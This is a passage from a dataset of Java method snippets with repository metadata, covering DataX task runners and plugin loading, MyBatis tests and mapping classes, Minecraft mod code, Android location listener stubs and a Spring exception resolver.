"url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/executor/engine/datax/datax-core/src/main/java/com/alibaba/datax/core/taskgroup/runner/ReaderRunner.java", "stars": "23", "class_props": {"extends": "AbstractRunner", "implements": ["Runnable"], "modifiers": ["public"]}}, {"id": 31707, "method_name": "run", "class_name": "ReaderRunner", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void run() {\n        Reader.Task taskReader = (Reader.Task) this.getPlugin();\n\n        //\u7edf\u8ba1waitWriterTime\uff0c\u5e76\u4e14\u5728finally\u624dend\u3002\n        PerfRecord channelWaitWrite = new PerfRecord(getTaskGroupId(), getTaskId(), PerfRecord.PHASE.WAIT_WRITE_TIME);\n        try {\n            channelWaitWrite.start();\n\n            LOG.debug(\"task reader starts to do init ...\");\n            PerfRecord initPerfRecord = new PerfRecord(getTaskGroupId(), getTaskId(), PerfRecord.PHASE.READ_TASK_INIT);\n            initPerfRecord.start();\n            taskReader.init();\n            initPerfRecord.end();\n\n            LOG.debug(\"task reader starts to do prepare ...\");\n            PerfRecord preparePerfRecord = new PerfRecord(getTaskGroupId(), getTaskId(), PerfRecord.PHASE.READ_TASK_PREPARE);\n            preparePerfRecord.start();\n            taskReader.prepare();\n            preparePerfRecord.end();\n\n            LOG.debug(\"task reader starts to read ...\");\n            PerfRecord dataPerfRecord = new PerfRecord(getTaskGroupId(), getTaskId(), PerfRecord.PHASE.READ_TASK_DATA);\n            dataPerfRecord.start();\n            if(null != recordSender) {\n                taskReader.startRead(recordSender);\n                recordSender.terminate();\n                dataPerfRecord.addCount(CommunicationTool.getTotalReadRecords(super.getRunnerCommunication()));\n            }else if(null != channelOutput){\n                taskReader.startRead(channelOutput);\n                channelOutput.close();\n            }\n            dataPerfRecord.addSize(CommunicationTool.getTotalReadBytes(super.getRunnerCommunication()));\n            dataPerfRecord.end();\n            LOG.debug(\"task reader starts to do post ...\");\n            PerfRecord postPerfRecord = new PerfRecord(getTaskGroupId(), getTaskId(), PerfRecord.PHASE.READ_TASK_POST);\n            postPerfRecord.start();\n            taskReader.post();\n            postPerfRecord.end();\n            // automatic flush\n            // super.markSuccess(); \u8fd9\u91cc\u4e0d\u80fd\u6807\u8bb0\u4e3a\u6210\u529f\uff0c\u6210\u529f\u7684\u6807\u5fd7\u7531 writerRunner \u6765\u6807\u5fd7\uff08\u5426\u5219\u53ef\u80fd\u5bfc\u81f4 reader \u5148\u7ed3\u675f\uff0c\u800c writer \u8fd8\u6ca1\u6709\u7ed3\u675f\u7684\u4e25\u91cd bug\uff09\n        } catch (Throwable e) {\n            if(shutdown){\n                //have been shutdown by task group container\n                return;\n            }\n            Throwable cause = e;\n            do{\n                if(cause instanceof InterruptedException || cause instanceof InterruptedIOException){\n                    this.getRunnerCommunication().setState(State.KILLED);\n                    return;\n                }\n                cause = cause.getCause();\n            }while(null != cause);\n            LOG.error(\"Reader runner Received Exceptions:\", e);\n            super.markFail(e);\n        } finally {\n            LOG.debug(\"task reader starts to do destroy ...\");\n            PerfRecord desPerfRecord = new PerfRecord(getTaskGroupId(), getTaskId(), PerfRecord.PHASE.READ_TASK_DESTROY);\n            desPerfRecord.start();\n            super.destroy();\n            desPerfRecord.end();\n\n            channelWaitWrite.end(super.getRunnerCommunication().getLongCounter(CommunicationTool.WAIT_WRITER_TIME));\n\n            long transformerUsedTime = super.getRunnerCommunication().getLongCounter(CommunicationTool.TRANSFORMER_USED_TIME);\n            if (transformerUsedTime > 0) {\n                PerfRecord transformerRecord = new PerfRecord(getTaskGroupId(), getTaskId(), PerfRecord.PHASE.TRANSFORMER_TIME);\n                transformerRecord.start();\n                transformerRecord.end(transformerUsedTime);\n            }\n        }\n    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/executor/engine/datax/datax-core/src/main/java/com/alibaba/datax/core/taskgroup/runner/ReaderRunner.java", "stars": "23", "class_props": {"extends": "AbstractRunner", "implements": ["Runnable"], "modifiers": ["public"]}}, {"id": 31708, "method_name": "shutdown", "class_name": "ReaderRunner", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void shutdown() {\n        shutdown = true;\n        if(null != recordSender){\n            recordSender.shutdown();\n        }\n        if(null != channelOutput){\n            channelOutput.shutdown();\n        }\n    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/executor/engine/datax/datax-core/src/main/java/com/alibaba/datax/core/taskgroup/runner/ReaderRunner.java", "stars": "23", "class_props": {"extends": "AbstractRunner", "implements": ["Runnable"], "modifiers": ["public"]}}, {"id": 31709, "method_name": "getId", "class_name": "Parent", "params": [], "throws": null, "modifiers": ["public"], "return_type": "int", "snippet": "  public int getId() {\n    return id;\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/submitted/parent_childs/Parent.java", "stars": "15", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 31710, "method_name": "setId", "class_name": "Parent", "params": ["int"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "  public void setId(int id) {\n    this.id = id;\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/submitted/parent_childs/Parent.java", "stars": "15", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 31711, "method_name": "getName", "class_name": "Parent", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "  public String getName() {\n    return name;\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/submitted/parent_childs/Parent.java", "stars": "15", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 31712, "method_name": "setName", "class_name": "Parent", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "  public void setName(String name) {\n    this.name = name;\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/submitted/parent_childs/Parent.java", "stars": "15", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 31713, "method_name": "getSurName", "class_name": "Parent", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "  public String getSurName() {\n    return surName;\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/submitted/parent_childs/Parent.java", "stars": "15", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 31714, "method_name": "setSurName", "class_name": "Parent", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "  public void setSurName(String surName) {\n    this.surName = surName;\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/submitted/parent_childs/Parent.java", "stars": "15", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 31715, "method_name": "getChilds", "class_name": "Parent", "params": [], "throws": null, "modifiers": ["public"], "return_type": "List<Child>", "snippet": "  public List<Child> getChilds() {\n    return childs;\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/submitted/parent_childs/Parent.java", "stars": "15", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 31716, "method_name": "setChilds", "class_name": "Parent", "params": ["List<Child>"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "  public void setChilds(List<Child> childs) {\n    this.childs = childs;\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/submitted/parent_childs/Parent.java", "stars": "15", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 31717, "method_name": "setUp", "class_name": "StringListTest", "params": [], "throws": ["Exception"], "modifiers": ["static"], "return_type": "void", "snippet": "  static void setUp() throws Exception {\n    // create a SqlSessionFactory\n    try (Reader reader = Resources.getResourceAsReader(\"org/apache/ibatis/submitted/stringlist/mybatis-config.xml\")) {\n      sqlSessionFactory = new SqlSessionFactoryBuilder().build(reader);\n    }\n\n    // populate in-memory database\n    BaseDataTest.runScript(sqlSessionFactory.getConfiguration().getEnvironment().getDataSource(),\n      \"org/apache/ibatis/submitted/stringlist/CreateDB.sql\");\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/submitted/stringlist/StringListTest.java", "stars": "15", "class_props": {"extends": null, "implements": null, "modifiers": []}}, {"id": 31718, "method_name": "shouldMapListOfStrings", "class_name": "StringListTest", "params": [], "throws": null, "modifiers": [], "return_type": "void", "snippet": "  void shouldMapListOfStrings() {\n    try (SqlSession sqlSession = sqlSessionFactory.openSession()) {\n      Mapper mapper = sqlSession.getMapper(Mapper.class);\n      List<User> users = mapper.getUsersAndGroups(1);\n      Assertions.assertEquals(1, users.size());\n      Assertions.assertEquals(2, users.get(0).getGroups().size());\n      Assertions.assertEquals(2, users.get(0).getRoles().size());\n    }\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/submitted/stringlist/StringListTest.java", "stars": "15", "class_props": {"extends": null, "implements": null, "modifiers": []}}, {"id": 31719, "method_name": "shouldMapListOfStringsToMap", "class_name": "StringListTest", "params": [], "throws": null, "modifiers": [], "return_type": "void", "snippet": "  void shouldMapListOfStringsToMap() {\n    try (SqlSession sqlSession = sqlSessionFactory.openSession()) {\n      Mapper mapper = sqlSession.getMapper(Mapper.class);\n      List<Map<String, Object>> results = mapper.getUsersAndGroupsMap(1);\n      Assertions.assertEquals(1, results.size());\n      Assertions.assertEquals(2, ((List<?>)results.get(0).get(\"groups\")).size());\n      Assertions.assertEquals(2, ((List<?>)results.get(0).get(\"roles\")).size());\n    }\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/submitted/stringlist/StringListTest.java", "stars": "15", "class_props": {"extends": null, "implements": null, "modifiers": []}}, {"id": 31720, "method_name": "shouldFailFastIfCollectionTypeIsAmbiguous", "class_name": "StringListTest", "params": [], "throws": ["Exception"], "modifiers": [], "return_type": "void", "snippet": "  void shouldFailFastIfCollectionTypeIsAmbiguous() throws Exception {\n    try (Reader reader = Resources\n      .getResourceAsReader(\"org/apache/ibatis/submitted/stringlist/mybatis-config-invalid.xml\")) {\n      new SqlSessionFactoryBuilder().build(reader);\n      fail(\"Should throw exception when collection type is unresolvable.\");\n    } catch (PersistenceException e) {\n      assertTrue(e.getMessage()\n        .contains(\"Ambiguous collection type for property 'groups'. You must specify 'javaType' or 'resultMap'.\"));\n    }\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/submitted/stringlist/StringListTest.java", "stars": "15", "class_props": {"extends": null, "implements": null, "modifiers": []}}, {"id": 31721, "method_name": "getId", "class_name": "ParameterMap", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "  public String getId() {\n    return id;\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/mapping/ParameterMap.java", "stars": "15", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 31722, "method_name": "getType", "class_name": "ParameterMap", "params": [], "throws": null, "modifiers": ["public"], "return_type": "Class<?>", "snippet": "  public Class<?> getType() {\n    return type;\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/mapping/ParameterMap.java", "stars": "15", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 31723, "method_name": "getParameterMappings", "class_name": "ParameterMap", "params": [], "throws": null, "modifiers": ["public"], "return_type": "List<ParameterMapping>", "snippet": "  public List<ParameterMapping> getParameterMappings() {\n    return parameterMappings;\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/mapping/ParameterMap.java", "stars": "15", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 31724, "method_name": "type", "class_name": "Builder", "params": [], "throws": null, "modifiers": ["public"], "return_type": "Class<?>", "snippet": "    public Class<?> type() {\n      return parameterMap.type;\n    }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/mapping/ParameterMap.java", "stars": "15", "class_props": {"extends": null, "implements": null, "modifiers": ["public", "static"]}}, {"id": 31725, "method_name": "build", "class_name": "Builder", "params": [], "throws": null, "modifiers": ["public"], "return_type": "ParameterMap", "snippet": "    public ParameterMap build() {\n      //lock down collections\n      parameterMap.parameterMappings = Collections.unmodifiableList(parameterMap.parameterMappings);\n      return parameterMap;\n    }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/mapping/ParameterMap.java", "stars": "15", "class_props": {"extends": null, "implements": null, "modifiers": ["public", "static"]}}, {"id": 31726, "method_name": "init", "class_name": "UtilityMod", "params": ["FMLInitializationEvent"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void init(FMLInitializationEvent event) {\n\t\tMinecraftForge.EVENT_BUS.register(this);\n\n\t\tEmojis.load(); // load emojis\n\n\t\tClanTags.load(); // load clans\n\t\tClanTags.PREFIX = \"/\"; // set the prefix of the command\n\t\tClientCommandHandler.instance.registerCommand(ClanTags.INFO_COMMAND); // register commands\n\t\tClientCommandHandler.instance.registerCommand(ClanTags.CLANS_COMMAND); // see each command for method to run on execute\n\t}", "url": "https://raw.githubusercontent.com/2b2t-Utilities/2b2t-Utilities/master/src/main/java/me/tigermouthbear/utilities/UtilityMod.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 31727, "method_name": "onChatMessage", "class_name": "UtilityMod", "params": ["ClientChatReceivedEvent"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void onChatMessage(ClientChatReceivedEvent event) {\n\t\tClanTags.handleClientChatReceivedEvent(event); // handle chat messages received\n\t}", "url": "https://raw.githubusercontent.com/2b2t-Utilities/2b2t-Utilities/master/src/main/java/me/tigermouthbear/utilities/UtilityMod.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 31728, "method_name": "hasCapability", "class_name": "TileEveBase", "params": ["Capability<?>", "EnumFacing"], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "    public boolean hasCapability(Capability<?> capability, @Nullable EnumFacing facing) {\n        return capability == CapabilityEVE.EVE || super.hasCapability(capability, facing);\n    }", "url": "https://raw.githubusercontent.com/Prunoideae/PhasePotion/master/src/main/java/com/naive/phase/Base/Tile/TileEveBase.java", "stars": "2", "class_props": {"extends": "TileBase", "implements": null, "modifiers": ["public"]}}, {"id": 31729, "method_name": "getCapability", "class_name": "TileEveBase", "params": ["Capability<T>", "EnumFacing"], "throws": null, "modifiers": ["public"], "return_type": "T", "snippet": "    public <T> T getCapability(Capability<T> capability, @Nullable EnumFacing facing) {\n        if (capability == CapabilityEVE.EVE) {\n            return CapabilityEVE.EVE.cast(energyHandlerDefault);\n        } else\n            return super.getCapability(capability, facing);\n    }", "url": "https://raw.githubusercontent.com/Prunoideae/PhasePotion/master/src/main/java/com/naive/phase/Base/Tile/TileEveBase.java", "stars": "2", "class_props": {"extends": "TileBase", "implements": null, "modifiers": ["public"]}}, {"id": 31730, "method_name": "readSyncNBT", "class_name": "TileEveBase", "params": ["NBTTagCompound"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void readSyncNBT(NBTTagCompound compound) {\n        energyHandlerDefault.getEVE().readFromNBT(compound.getCompoundTag(TAG_EVE));\n    }", "url": "https://raw.githubusercontent.com/Prunoideae/PhasePotion/master/src/main/java/com/naive/phase/Base/Tile/TileEveBase.java", "stars": "2", "class_props": {"extends": "TileBase", "implements": null, "modifiers": ["public"]}}, {"id": 31731, "method_name": "writeSyncNBT", "class_name": "TileEveBase", "params": ["NBTTagCompound"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void writeSyncNBT(NBTTagCompound compound) {\n        compound.setTag(TAG_EVE, energyHandlerDefault.getEVE().writeToNBT());\n    }", "url": "https://raw.githubusercontent.com/Prunoideae/PhasePotion/master/src/main/java/com/naive/phase/Base/Tile/TileEveBase.java", "stars": "2", "class_props": {"extends": "TileBase", "implements": null, "modifiers": ["public"]}}, {"id": 31732, "method_name": "onLocationChanged", "class_name": "SingleLocationListener", "params": ["android"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void onLocationChanged (android.location.Location p0)\n\t{\n\t\tn_onLocationChanged (p0);\n\t}", "url": "https://raw.githubusercontent.com/AtomizedSoul/TulpApp/master/TulpApp.Android/obj/Debug/90/android/src/crc64a0e0a82d0db9a07d/SingleLocationListener.java", "stars": "2", "class_props": {"extends": "java", "implements": ["mono", "android"], "modifiers": ["public"]}}, {"id": 31733, "method_name": "n_onLocationChanged", "class_name": "SingleLocationListener", "params": ["android"], "throws": null, "modifiers": ["private", "native"], "return_type": "void", "snippet": "\tprivate native void n_onLocationChanged (android.location.Location p0);\n\n\n\tpublic void onProviderDisabled (java.lang.String p0)\n\t{\n\t\tn_onProviderDisabled (p0);\n\t}", "url": "https://raw.githubusercontent.com/AtomizedSoul/TulpApp/master/TulpApp.Android/obj/Debug/90/android/src/crc64a0e0a82d0db9a07d/SingleLocationListener.java", "stars": "2", "class_props": {"extends": "java", "implements": ["mono", "android"], "modifiers": ["public"]}}, {"id": 31734, "method_name": "onProviderDisabled", "class_name": "SingleLocationListener", "params": ["java"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void onProviderDisabled (java.lang.String p0)\n\t{\n\t\tn_onProviderDisabled (p0);\n\t}", "url": "https://raw.githubusercontent.com/AtomizedSoul/TulpApp/master/TulpApp.Android/obj/Debug/90/android/src/crc64a0e0a82d0db9a07d/SingleLocationListener.java", "stars": "2", "class_props": {"extends": "java", "implements": ["mono", "android"], "modifiers": ["public"]}}, {"id": 31735, "method_name": "n_onProviderDisabled", "class_name": "SingleLocationListener", "params": ["java"], "throws": null, "modifiers": ["private", "native"], "return_type": "void", "snippet": "\tprivate native void n_onProviderDisabled (java.lang.String p0);\n\n\n\tpublic void onProviderEnabled (java.lang.String p0)\n\t{\n\t\tn_onProviderEnabled (p0);\n\t}", "url": "https://raw.githubusercontent.com/AtomizedSoul/TulpApp/master/TulpApp.Android/obj/Debug/90/android/src/crc64a0e0a82d0db9a07d/SingleLocationListener.java", "stars": "2", "class_props": {"extends": "java", "implements": ["mono", "android"], "modifiers": ["public"]}}, {"id": 31736, "method_name": "onProviderEnabled", "class_name": "SingleLocationListener", "params": ["java"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void onProviderEnabled (java.lang.String p0)\n\t{\n\t\tn_onProviderEnabled (p0);\n\t}", "url": "https://raw.githubusercontent.com/AtomizedSoul/TulpApp/master/TulpApp.Android/obj/Debug/90/android/src/crc64a0e0a82d0db9a07d/SingleLocationListener.java", "stars": "2", "class_props": {"extends": "java", "implements": ["mono", "android"], "modifiers": ["public"]}}, {"id": 31737, "method_name": "n_onProviderEnabled", "class_name": "SingleLocationListener", "params": ["java"], "throws": null, "modifiers": ["private", "native"], "return_type": "void", "snippet": "\tprivate native void n_onProviderEnabled (java.lang.String p0);\n\n\n\tpublic void onStatusChanged (java.lang.String p0, int p1, android.os.Bundle p2)\n\t{\n\t\tn_onStatusChanged (p0, p1, p2);\n\t}", "url": "https://raw.githubusercontent.com/AtomizedSoul/TulpApp/master/TulpApp.Android/obj/Debug/90/android/src/crc64a0e0a82d0db9a07d/SingleLocationListener.java", "stars": "2", "class_props": {"extends": "java", "implements": ["mono", "android"], "modifiers": ["public"]}}, {"id": 31738, "method_name": "onStatusChanged", "class_name": "SingleLocationListener", "params": ["java", "int", "android"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void onStatusChanged (java.lang.String p0, int p1, android.os.Bundle p2)\n\t{\n\t\tn_onStatusChanged (p0, p1, p2);\n\t}", "url": "https://raw.githubusercontent.com/AtomizedSoul/TulpApp/master/TulpApp.Android/obj/Debug/90/android/src/crc64a0e0a82d0db9a07d/SingleLocationListener.java", "stars": "2", "class_props": {"extends": "java", "implements": ["mono", "android"], "modifiers": ["public"]}}, {"id": 31739, "method_name": "n_onStatusChanged", "class_name": "SingleLocationListener", "params": ["java", "int", "android"], "throws": null, "modifiers": ["private", "native"], "return_type": "void", "snippet": "\tprivate native void n_onStatusChanged (java.lang.String p0, int p1, android.os.Bundle p2);\n\n\tprivate java.util.ArrayList refList;\n\tpublic void monodroidAddReference (java.lang.Object obj)\n\t{\n\t\tif (refList == null)\n\t\t\trefList = new java.util.ArrayList ();\n\t\trefList.add (obj);\n\t}", "url": "https://raw.githubusercontent.com/AtomizedSoul/TulpApp/master/TulpApp.Android/obj/Debug/90/android/src/crc64a0e0a82d0db9a07d/SingleLocationListener.java", "stars": "2", "class_props": {"extends": "java", "implements": ["mono", "android"], "modifiers": ["public"]}}, {"id": 31740, "method_name": "monodroidAddReference", "class_name": "SingleLocationListener", "params": ["java"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void monodroidAddReference (java.lang.Object obj)\n\t{\n\t\tif (refList == null)\n\t\t\trefList = new java.util.ArrayList ();\n\t\trefList.add (obj);\n\t}", "url": "https://raw.githubusercontent.com/AtomizedSoul/TulpApp/master/TulpApp.Android/obj/Debug/90/android/src/crc64a0e0a82d0db9a07d/SingleLocationListener.java", "stars": "2", "class_props": {"extends": "java", "implements": ["mono", "android"], "modifiers": ["public"]}}, {"id": 31741, "method_name": "monodroidClearReferences", "class_name": "SingleLocationListener", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void monodroidClearReferences ()\n\t{\n\t\tif (refList != null)\n\t\t\trefList.clear ();\n\t}", "url": "https://raw.githubusercontent.com/AtomizedSoul/TulpApp/master/TulpApp.Android/obj/Debug/90/android/src/crc64a0e0a82d0db9a07d/SingleLocationListener.java", "stars": "2", "class_props": {"extends": "java", "implements": ["mono", "android"], "modifiers": ["public"]}}, {"id": 31742, "method_name": "contextLoads", "class_name": "OsworksApiApplicationTests", "params": [], "throws": null, "modifiers": [], "return_type": "void", "snippet": "\tvoid contextLoads() {\n\t}", "url": "https://raw.githubusercontent.com/jeanpsilva/osworks/master/src/test/java/com/algaworks/osworks/OsworksApiApplicationTests.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": []}}, {"id": 31743, "method_name": "toString", "class_name": "LoginResult", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "    public String toString() {\n        return \"LoginResultData{\" +\n                \"username='\" + username + '\\'' +\n                \", token='\" + token + '\\'' +\n                \", mobile='\" + mobile + '\\'' +\n                \", userInfo=\" + userInfo +\n                '}';\n    }", "url": "https://raw.githubusercontent.com/guozaizai/myHttpSdkDemo/master/app/src/main/java/myapp/com/xm/myapplication/Model/LoginResult.java", "stars": "9", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 31744, "method_name": "resolveException", "class_name": "WebExceptionResolver", "params": ["HttpServletRequest", "HttpServletResponse", "Object", "Exception"], "throws": null, "modifiers": ["public"], "return_type": "ModelAndView", "snippet": "\tpublic ModelAndView resolveException(HttpServletRequest request,\n\t\t\tHttpServletResponse response, Object handler, Exception ex) {\n\n\t\tif (!(ex instanceof XxlJobException)) {\n\t\t\tlogger.error(\"WebExceptionResolver:{}\", ex);\n\t\t}\n\n\t\t// if json\n\t\tboolean isJson = false;\n\t\tHandlerMethod method = (HandlerMethod)handler;\n\t\tResponseBody responseBody = method.getMethodAnnotation(ResponseBody.class);\n\t\tif (responseBody != null) {\n\t\t\tisJson = true;\n\t\t}\n\n\t\t// error result\n\t\tReturnT<String> errorResult = new ReturnT<String>(ReturnT.FAIL_CODE, ex.toString().replaceAll(\"\\n\", \"<br/>\"));\n\n\t\t// response\n\t\tModelAndView mv = new ModelAndView();\n\t\tif (isJson) {\n\t\t\ttry {\n\t\t\t\tresponse.setContentType(\"application/json;charset=utf-8\");\n\t\t\t\tresponse.getWriter().print(JacksonUtil.writeValueAsString(errorResult));\n\t\t\t} catch (IOException e) {\n\t\t\t\tlogger.error(e.getMessage(), e);\n\t\t\t}\n\t\t\treturn mv;\n\t\t} else {\n\n\t\t\tmv.addObject(\"exceptionMsg\", errorResult.getMsg());\n\t\t\tmv.setViewName(\"/common/common.exception\");\n\t\t\treturn mv;\n\t\t}\n\t}", "url": "https://raw.githubusercontent.com/miaoo92/xxl-job-mongo/master/src/main/java/com/avon/rga/controller/resolver/WebExceptionResolver.java", "stars": "1", "class_props": {"extends": null, "implements": ["HandlerExceptionResolver"], "modifiers": ["public"]}}, {"id": 31745, "method_name": "bind", "class_name": "LoadUtil", "params": ["Configuration"], "throws": null, "modifiers": ["public", "static"], "return_type": "void", "snippet": "    public static void bind(Configuration pluginConfigs) {\n        pluginRegisterCenter = pluginConfigs;\n    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/executor/engine/datax/datax-core/src/main/java/com/alibaba/datax/core/util/container/LoadUtil.java", "stars": "23", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 31746, "method_name": "generatePluginKey", "class_name": "LoadUtil", "params": ["PluginType", "String"], "throws": null, "modifiers": ["private", "static"], "return_type": "String", "snippet": "    private static String generatePluginKey(PluginType pluginType,\n                                            String pluginName) {\n        return String.format(pluginTypeNameFormat, pluginType.toString(),\n                pluginName);\n    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/executor/engine/datax/datax-core/src/main/java/com/alibaba/datax/core/util/container/LoadUtil.java", "stars": "23", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 31747, "method_name": "getPluginConf", "class_name": "LoadUtil", "params": ["PluginType", "String"], "throws": null, "modifiers": ["private", "static"], "return_type": "Configuration", "snippet": "    private static Configuration getPluginConf(PluginType pluginType,\n                                               String pluginName) {\n        Configuration pluginConf = pluginRegisterCenter\n                .getConfiguration(generatePluginKey(pluginType, pluginName));\n\n        if (null == pluginConf) {\n            throw DataXException.asDataXException(\n                    FrameworkErrorCode.PLUGIN_INSTALL_ERROR,\n                    String.format(\"DataX\u4e0d\u80fd\u627e\u5230\u63d2\u4ef6[%s]\u7684\u914d\u7f6e.\",\n                            pluginName));\n        }\n\n        return pluginConf;\n    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/executor/engine/datax/datax-core/src/main/java/com/alibaba/datax/core/util/container/LoadUtil.java", "stars": "23", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 31748, "method_name": "loadJobPlugin", "class_name": "LoadUtil", "params": ["PluginType", "String"], "throws": null, "modifiers": ["public", "static"], "return_type": "AbstractJobPlugin", "snippet": "    public static AbstractJobPlugin loadJobPlugin(PluginType pluginType,\n                                                  String pluginName) {\n        Class<? extends AbstractPlugin> clazz = LoadUtil.loadPluginClass(\n                pluginType, pluginName, ContainerType.Job);\n\n        try {\n            AbstractJobPlugin jobPlugin = (AbstractJobPlugin) clazz\n                    .newInstance();\n            jobPlugin.setPluginConf(getPluginConf(pluginType, pluginName));\n            return jobPlugin;\n        } catch (Exception e) {\n            throw DataXException.asDataXException(\n                    FrameworkErrorCode.RUNTIME_ERROR,\n                    String.format(\"DataX\u627e\u5230plugin[%s]\u7684Job\u914d\u7f6e.\",\n                            pluginName), e);\n        }\n    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/executor/engine/datax/datax-core/src/main/java/com/alibaba/datax/core/util/container/LoadUtil.java", "stars": "23", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 31749, "method_name": "loadTaskPlugin", "class_name": "LoadUtil", "params": ["PluginType", "String"], "throws": null, "modifiers": ["public", "static"], "return_type": "AbstractTaskPlugin", "snippet": "    public static AbstractTaskPlugin loadTaskPlugin(PluginType pluginType,\n                                                    String pluginName) {\n        Class<? extends AbstractPlugin> clazz = LoadUtil.loadPluginClass(\n                pluginType, pluginName, ContainerType.Task);\n\n        try {\n            AbstractTaskPlugin taskPlugin = (AbstractTaskPlugin) clazz\n                    .newInstance();\n            taskPlugin.setPluginConf(getPluginConf(pluginType, pluginName));\n            return taskPlugin;\n        } catch (Exception e) {\n            throw DataXException.asDataXException(FrameworkErrorCode.RUNTIME_ERROR,\n                    String.format(\"DataX\u4e0d\u80fd\u627eplugin[%s]\u7684Task\u914d\u7f6e.\",\n                            pluginName), e);\n        }\n    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/executor/engine/datax/datax-core/src/main/java/com/alibaba/datax/core/util/container/LoadUtil.java", "stars": "23", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 31750, "method_name": "loadPluginRunner", "class_name": "LoadUtil", "params": ["PluginType", "String"], "throws": null, "modifiers": ["public", "static"], "return_type": "AbstractRunner", "snippet": "    public static AbstractRunner loadPluginRunner(PluginType pluginType, String pluginName) {\n        AbstractTaskPlugin taskPlugin = LoadUtil.loadTaskPlugin(pluginType,\n                pluginName);\n\n        switch (pluginType) {\n            case READER:\n                return new ReaderRunner(taskPlugin);\n            case WRITER:\n                return new WriterRunner(taskPlugin);\n            default:\n                throw DataXException.asDataXException(\n                        FrameworkErrorCode.RUNTIME_ERROR,\n                        String.format(\"\u63d2\u4ef6[%s]\u7684\u7c7b\u578b\u5fc5\u987b\u662f[reader]\u6216[writer]!\",\n                                